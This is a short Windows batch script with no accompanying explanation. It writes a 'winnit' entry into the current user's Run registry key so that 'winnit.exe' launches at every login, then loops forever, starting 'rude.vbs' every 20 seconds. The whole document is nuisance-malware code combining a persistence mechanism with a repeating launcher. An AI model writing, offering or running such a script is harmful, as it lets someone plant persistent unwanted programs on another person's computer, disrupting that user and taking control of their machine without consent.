reg add HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v winnit /d "winnit.exe" /f
:main
start rude.vbs
timeout 20
goto main
